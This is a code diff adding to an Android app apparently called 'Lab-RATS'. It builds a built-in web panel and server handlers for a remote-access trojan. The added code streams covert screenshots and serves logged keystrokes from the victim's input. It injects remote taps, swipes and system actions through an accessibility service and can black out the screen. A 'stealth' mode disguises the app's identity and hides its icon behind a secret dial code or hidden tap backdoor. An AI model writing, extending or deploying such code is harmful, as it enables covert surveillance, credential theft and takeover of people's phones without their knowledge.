+        html.append("<div id=\"ghost-terminal\" class=\"terminal-text\" style=\"height:300px; overflow-y:auto; white-space:pre-wrap; border:1px solid rgba(0, 242, 255, 0.1);\">");
+        html.append("[WAITING_FOR_UPLINK] Monitoring focused app input...");
+        html.append("</div>");
+        html.append("<p style=\"color: #555; font-size: 0.65rem; margin-top: 10px;\">NOTE: Recovery from stealth requires dial code <b>*#1337#</b> or finding the hidden 10-tap backdoor in the decoy display.</p>");
+        html.append("</div>");
+        
+        html.append("<div style=\"height: 50px;\"></div>"); // Buffer
+
+        html.append("<script>");
+        html.append("var ghostScreenActive = false;");
+        html.append("function startGhostScreen() {");
+        html.append("  ghostScreenActive = true;");
+        html.append("  document.getElementById('ghost-screen-status').innerHTML = 'CONNECTING...';");
+        html.append("  document.getElementById('ghost-start-btn').style.display = 'none';");
+        html.append("  document.getElementById('ghost-stop-btn').style.display = 'inline-block';");
+        html.append("  refreshGhostScreen();");
+        html.append("}");
+        html.append("function stopGhostScreen() {");
+        html.append("  ghostScreenActive = false;");
+        html.append("  document.getElementById('ghost-screen-status').innerHTML = 'COVERT_FEED_STANDBY';");
+        html.append("  document.getElementById('ghost-screen-status').style.display = 'block';");
+        html.append("  document.getElementById('ghost-screen-stream').src = '';");
+        html.append("  document.getElementById('ghost-start-btn').style.display = 'inline-block';");
+        html.append("  document.getElementById('ghost-stop-btn').style.display = 'none';");
+        html.append("}");
+        html.append("function refreshGhostScreen() {");
+        html.append("  if (!ghostScreenActive) return;");
+        html.append("  const img = document.getElementById('ghost-screen-stream');");
+        // Using the new covert screenshot route
+        html.append("  img.src = '/ghost/screenshot?t=' + Date.now();");
+        html.append("  img.onload = () => { document.getElementById('ghost-screen-status').style.display = 'none'; };");
+        html.append("  img.onerror = () => { console.log('Covert shot failed, retrying...'); };");
+        html.append("  setTimeout(refreshGhostScreen, 1500);"); // Slightly slower for stability
+        html.append("}");
+        html.append("var ghostDragStart = null;");
+        html.append("function startGhostDrag(e) {");
+        html.append("  const img = document.getElementById('ghost-screen-stream');");
+        html.append("  const rect = img.getBoundingClientRect();");
+        html.append("  ghostDragStart = {");
+        html.append("    x: ((e.clientX - rect.left) / rect.width) * 100,");
+        html.append("    y: ((e.clientY - rect.top) / rect.height) * 100,");
+        html.append("    t: Date.now()");
+        html.append("  };");
+        html.append("}");
+        html.append("function endGhostDrag(e) {");
+        html.append("  if (!ghostDragStart) return;");
+        html.append("  const img = document.getElementById('ghost-screen-stream');");
+        html.append("  const rect = img.getBoundingClientRect();");
+        html.append("  const endX = ((e.clientX - rect.left) / rect.width) * 100;");
+        html.append("  const endY = ((e.clientY - rect.top) / rect.height) * 100;");
+        html.append("  const duration = Date.now() - ghostDragStart.t;");
+        html.append("  const dist = Math.sqrt(Math.pow(endX - ghostDragStart.x, 2) + Math.pow(endY - ghostDragStart.y, 2));");
+        html.append("  if (dist < 2) {");
+        html.append("    fetch('/ghost/interact?action=click&px=' + ghostDragStart.x + '&py=' + ghostDragStart.y);");
+        html.append("  } else {");
+        html.append("    fetch('/ghost/interact?action=swipe&px1=' + ghostDragStart.x + '&py1=' + ghostDragStart.y + '&px2=' + endX + '&py2=' + endY + '&d=' + Math.max(duration, 100));");
+        html.append("  }");
+        html.append("  ghostDragStart = null;");
+        html.append("}");
+        html.append("function openSettings() { fetch('/ghost/interact?action=settings'); }");
+        html.append("function toggleStealth() {");
+        html.append("  const type = document.getElementById('stealth-type').value;");
+        html.append("  if(confirm('Initiate Stealth Protocol? This will change the app identity.')) {");
+        html.append("    fetch('/stealth?type=' + type).then(r => r.json()).then(d => {");
+        html.append("      alert(d.mode === 'stealth' ? 'STEALTH_ACTIVE: Identity replaced.' : 'STEALTH_DISENGAGED: Main icon restored.');");
+        html.append("    });");
+        html.append("  }");
+        html.append("}");
+        html.append("function restoreNormal() {");
+        html.append("  if(confirm('Restore normal identity? This will re-enable the main Lab-RATS icon.')) {");
+        html.append("    fetch('/stealth?action=restore').then(r => r.json()).then(d => {");
+        html.append("      alert('STEALTH_DISENGAGED: Main icon restored.');");
+        html.append("    });");
+        html.append("  }");
+        html.append("}");
+        html.append("function ghostAction(a) { fetch('/ghost/interact?action='+a); }");
+        html.append("function clearGhostLogs() { if(confirm('Purge captured keystrokes?')) fetch('/ghost/clear').then(() => refreshGhostLogs()); }");
+        html.append("async function refreshGhostLogs() {");
+        html.append("  const r = await fetch('/ghost/keys'); const data = await r.json();");
+        html.append("  const term = document.getElementById('ghost-terminal');");
+        html.append("  if(data.keys.length > 0) term.innerHTML = data.keys.join('');");
+        html.append("}");
+        html.append("async function checkGhostStatus() {");
+        html.append("  try {");
+        html.append("    const r = await fetch('/ghost/status'); const data = await r.json();");
+        html.append("    const card = document.getElementById('ghost-status-card');");
+        html.append("    const text = document.getElementById('ghost-status-text');");
+        html.append("    const prompt = document.getElementById('accessibility-prompt');");
+        html.append("    if (data.active) {");
+        html.append("      card.style.borderColor = 'var(--neon-green)';");
+        html.append("      text.innerHTML = '<span style=\"color:var(--neon-green);\">UPLINK_ESTABLISHED</span>';");
+        html.append("      prompt.style.display = 'none';");
+        html.append("    } else {");
+        html.append("      card.style.borderColor = 'var(--danger)';");
+        html.append("      text.innerHTML = '<span style=\"color:var(--danger);\">OFFLINE_AWAITING_PERMISSION</span>';");
+        html.append("      prompt.style.display = 'block';");
+        html.append("    }");
+        html.append("  } catch(e) {}");
+        html.append("}");
+        html.append("setInterval(checkGhostStatus, 2000);");
+        html.append("setInterval(refreshGhostLogs, 2000);");
+        html.append("</script>");
+
+        html.append("</div>");
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response serveKeystrokes() {
+        org.json.JSONArray array = new org.json.JSONArray();
+        for (String key : GhostService.getKeystrokes()) {
+            array.put(key);
+        }
+        try {
+            org.json.JSONObject obj = new org.json.JSONObject();
+            obj.put("keys", array);
+            return newFixedLengthResponse(Response.Status.OK, "application/json", obj.toString());
+        } catch (Exception e) { return serveError(e.getMessage()); }
+    }
+
+    private Response performInteraction(Map<String, String> params) {
+        String action = params.get("action");
+        GhostService ghost = GhostService.getInstance();
+        
+        if (action == null) return serveError("No action");
+
+        if (action.equals("settings")) {
+            Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
+        }
+
+        if (ghost == null) return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"Ghost Service Offline\"}");
+
+        boolean success = false;
+        switch (action) {
+            case "click":
+                if (params.containsKey("px") && params.containsKey("py")) {
+                    float px = Float.parseFloat(params.get("px"));
+                    float py = Float.parseFloat(params.get("py"));
+                    int realX = (int) (px * ghost.getScreenWidth() / 100);
+                    int realY = (int) (py * ghost.getScreenHeight() / 100);
+                    success = ghost.clickAt(realX, realY);
+                } else if (params.containsKey("x") && params.containsKey("y")) {
+                    int x = Integer.parseInt(params.get("x"));
+                    int y = Integer.parseInt(params.get("y"));
+                    success = ghost.clickAt(x, y);
+                }
+                break;
+            case "swipe":
+                if (params.containsKey("px1") && params.containsKey("py1") && params.containsKey("px2") && params.containsKey("py2")) {
+                    float px1 = Float.parseFloat(params.get("px1"));
+                    float py1 = Float.parseFloat(params.get("py1"));
+                    float px2 = Float.parseFloat(params.get("px2"));
+                    float py2 = Float.parseFloat(params.get("py2"));
+                    int d = Integer.parseInt(params.get("d"));
+                    int x1 = (int) (px1 * ghost.getScreenWidth() / 100);
+                    int y1 = (int) (py1 * ghost.getScreenHeight() / 100);
+                    int x2 = (int) (px2 * ghost.getScreenWidth() / 100);
+                    int y2 = (int) (py2 * ghost.getScreenHeight() / 100);
+                    success = ghost.swipe(x1, y1, x2, y2, d);
+                }
+                break;
+            case "home":
+                success = ghost.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
+                break;
+            case "back":
+                success = ghost.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
+                break;
+            case "recents":
+                success = ghost.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
+                break;
+            case "blackout_on":
+                ghost.startBlackout(true);
+                success = true;
+                break;
+            case "blackout_off":
+                ghost.startBlackout(false);
+                success = true;
+                break;
+            case "autoheal":
+                ghost.runAutoHeal();
+                success = true;
+                break;
+        }
+
+        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":" + success + "}");
     }
 }
